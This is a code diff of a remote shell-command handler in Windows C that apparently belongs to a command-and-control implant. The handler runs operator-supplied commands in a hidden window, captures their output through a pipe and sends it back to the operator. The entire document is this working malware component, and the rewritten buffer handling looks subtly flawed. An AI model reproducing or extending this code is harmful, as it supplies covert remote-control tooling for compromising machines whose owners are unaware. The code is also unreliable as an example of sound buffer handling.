@@ -3,142 +3,129 @@
 
 
 // ======================================================================================
+
 FUNC VOID CmdShell(
     _In_ PPARSER Parser
 ){
-
     BLACKOUT_INSTANCE
-    
-    BK_PACKAGE = PackageCreate( COMMAND_SHELL );
+    BK_PACKAGE = PackageCreate(COMMAND_SHELL);
 
     PCHAR CmdLine = ParserGetString(Parser, NULL);
+    HANDLE hStdOutBackup = Instance()->Win32.GetStdHandle(STD_OUTPUT_HANDLE);
+    
+    // Pipe handles
+    HANDLE hPipeRead = NULL;
+    HANDLE hPipeWrite = NULL;
+    
+    // Security attributes for inheritable pipe
+    
+    // SECURITY_ATTRIBUTES sa = {
+    //     .nLength = sizeof(SECURITY_ATTRIBUTES),
+    //     .bInheritHandle = TRUE,
+    //     .lpSecurityDescriptor = NULL
+    // };
+    SECURITY_ATTRIBUTES sa;
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+    sa.bInheritHandle = TRUE;
+    sa.lpSecurityDescriptor = NULL;
+    
 
-    PROCESS_INFORMATION ProcessInfo;
-    STARTUPINFOA StartInfo;
-    SECURITY_ATTRIBUTES saAttr;
-
-    HANDLE stdoutReadHandle = NULL;
-    HANDLE stdoutWriteHandle = NULL;
-
-    PCHAR OutBuffer = NULL;
-    PCHAR TempBuffer = NULL;
-    DWORD OutBufferSize = 0;
-    DWORD TotalBytesRead = 0;
-
-    DWORD bytes_read;
-
-    MmZero(&saAttr, sizeof(saAttr));
-    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
-    saAttr.bInheritHandle = TRUE; 
-    saAttr.lpSecurityDescriptor = NULL; 
-
-    if (!Instance()->Win32.CreatePipe(&stdoutReadHandle, &stdoutWriteHandle, &saAttr, 0)) {
-        BK_PRINT("[=] Error creating pipe... Error => %ld\n", NtLastError());
-        PackageTransmitError( NtLastError() );
+    // Create anonymous pipe
+    if (!Instance()->Win32.CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0)) {
+        BK_PRINT("[-] CreatePipe failed: %ld\n", NtLastError());
+        PackageTransmitError(NtLastError());
         return;
     }
 
-    if (!Instance()->Win32.SetHandleInformation(stdoutReadHandle, HANDLE_FLAG_INHERIT, 0)) {
-        BK_PRINT("[=] Error SetHandleInformation... Error => %ld\n", NtLastError());
-        PackageTransmitError( NtLastError() );
+    // Ensure read handle isn't inherited
+    if (!Instance()->Win32.SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0)) {
+        BK_PRINT("[-] SetHandleInformation failed: %ld\n", NtLastError());
+        PackageTransmitError(NtLastError());
+        bkHandleClose(hPipeRead);
+        bkHandleClose(hPipeWrite);
         return;
     }
 
-    MmZero(&StartInfo, sizeof(StartInfo));
-    StartInfo.cb = sizeof(StartInfo);
-    StartInfo.hStdError = stdoutWriteHandle;
-    StartInfo.hStdOutput = stdoutWriteHandle;
-    StartInfo.dwFlags |= STARTF_USESTDHANDLES;
+    // Set up process creation
+    PROCESS_INFORMATION pi;
+    STARTUPINFOA si;
+    MmZero(&si, sizeof(STARTUPINFOA));
+    si.cb = sizeof(STARTUPINFOA);
+    si.hStdOutput = hPipeWrite;
+    si.hStdError = hPipeWrite;
+    si.dwFlags |= STARTF_USESTDHANDLES;
 
+    // Create hidden console if needed
+    HWND hConsole = Instance()->Win32.GetConsoleWindow();
+    if (!hConsole) {
+        Instance()->Win32.AllocConsole();
+        hConsole = Instance()->Win32.GetConsoleWindow();
+        if (hConsole) {
+            Instance()->Win32.ShowWindow(hConsole, SW_HIDE);
+        }
+    }
+
+    // Redirect standard output
+    Instance()->Win32.SetStdHandle(STD_OUTPUT_HANDLE, hPipeWrite);
+
+    // Create process
     if (!Instance()->Win32.CreateProcessA(
-        NULL, 
-        CmdLine, 
-        NULL, 
-        NULL, 
+        NULL,
+        CmdLine,
+        NULL,
+        NULL,
         TRUE,
-        CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, 
-        NULL, 
-        NULL, 
-        &StartInfo, 
-        &ProcessInfo
-    )){
-        BK_PRINT("[=] Error CreateProcessW... Error => %ld\n", NtLastError());
-        PackageTransmitError( NtLastError() );
+        CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    )) {
+        BK_PRINT("[-] CreateProcess failed: %ld\n", NtLastError());
+        PackageTransmitError(NtLastError());
+        Instance()->Win32.SetStdHandle(STD_OUTPUT_HANDLE, hStdOutBackup);
+        bkHandleClose(hPipeRead);
+        bkHandleClose(hPipeWrite);
         return;
     }
 
-    bkHandleClose(stdoutWriteHandle);
+    // Clean up write handles (child process owns them now)
+    bkHandleClose(hPipeWrite);
+    bkHandleClose(pi.hThread);
 
-    // Initialize a dynamic buffer
-    OutBufferSize = 5000;
-    OutBuffer = (PCHAR)bkHeapAlloc(OutBufferSize);
-    if (!OutBuffer) {
-        BK_PRINT("[=] Memory allocation failed for OutBuffer\n");
-        PackageTransmitError( NtLastError() );
-        return;
-    }
-    MmZero(OutBuffer, OutBufferSize);
+    // Read output buffer
+    CHAR buffer[4096];
+    DWORD bytesRead;
+    DWORD totalSize = 0;
+    PCHAR output = (PCHAR)bkHeapAlloc(1048);
 
-    TempBuffer = (PCHAR)bkHeapAlloc(5000);
-    if (!TempBuffer) {
-        BK_PRINT("[=] Memory allocation failed for TempBuffer\n");
-        bkHeapFree(OutBuffer, OutBufferSize);
-        return;
-    }
-
-    while (TRUE) {
-        if (!Instance()->Win32.ReadFile(stdoutReadHandle, TempBuffer, 5000, &bytes_read, NULL)) {
-            if (NtLastError() == ERROR_BROKEN_PIPE) {
-                break; // Normal exit
-            }
-            BK_PRINT("[=] Error ReadFile... Error => %ld\n", NtLastError());
-            PackageTransmitError( NtLastError() );
+    while (Instance()->Win32.ReadFile(hPipeRead, buffer, sizeof(buffer), &bytesRead, NULL)) {
+        PCHAR newOutput = (PCHAR)bkHeapReAlloc(output, totalSize + bytesRead + 1);
+        if (!newOutput) {
+            BK_PRINT("[-] Memory allocation failed\n");
             break;
         }
 
-        if (bytes_read > 0) {
-            // Ensure enough space in OutBuffer
-            if (TotalBytesRead + bytes_read >= OutBufferSize) {
-                OutBufferSize *= 2;
-                PCHAR NewBuffer = (PCHAR)bkHeapReAlloc(OutBuffer, OutBufferSize);
-                if (!NewBuffer) {
-                    BK_PRINT("[=] Memory reallocation failed\n");
-                    bkHeapFree(OutBuffer, OutBufferSize);
-                    bkHeapFree(TempBuffer, OutBufferSize);
-                    return;
-                }
-                OutBuffer = NewBuffer;
-            }
-
-            // Append TempBuffer to OutBuffer
-            MmCopy(OutBuffer + TotalBytesRead, TempBuffer, bytes_read);
-            TotalBytesRead += bytes_read;
-        }
+        BK_PRINT("Executed => %s\n", buffer);
+        output = newOutput;
+        MmCopy(output + totalSize, buffer, bytesRead);
+        totalSize += bytesRead;
+        output[totalSize] = '\0';
     }
 
-    // Null-terminate the final output
-    if (TotalBytesRead < OutBufferSize) {
-        OutBuffer[TotalBytesRead] = '\0';
-    } else {
-        OutBuffer = (PCHAR)bkHeapReAlloc(OutBuffer, TotalBytesRead + 1);
-        OutBuffer[TotalBytesRead] = '\0';
+    // Restore original stdout
+    Instance()->Win32.SetStdHandle(STD_OUTPUT_HANDLE, hStdOutBackup);
+
+    // Cleanup
+    bkHandleClose(hPipeRead);
+    bkHandleClose(pi.hProcess);
+
+    if (output) {
+        PackageAddString(BK_PACKAGE, output);
+        bkHeapFree(output, totalSize + 1);
     }
 
-    BK_PRINT("OUTPUT => %s\n", OutBuffer);
-    
-    // Transmit the dynamic output buffer
-
-    BK_PRINT("[+] Transmitting Output\n");
-    PackageAddString(BK_PACKAGE, OutBuffer);
-    __debugbreak();
     PackageTransmit(BK_PACKAGE, NULL, NULL);
-    // Clean up
-    bkHandleClose(ProcessInfo.hProcess);
-    bkHandleClose(ProcessInfo.hThread);
-    bkHandleClose(stdoutReadHandle);
-    bkHeapFree(TempBuffer, OutBufferSize);
-
-    bkHeapFree(OutBuffer, OutBufferSize); // Free dynamic buffer
     return;
 }
 
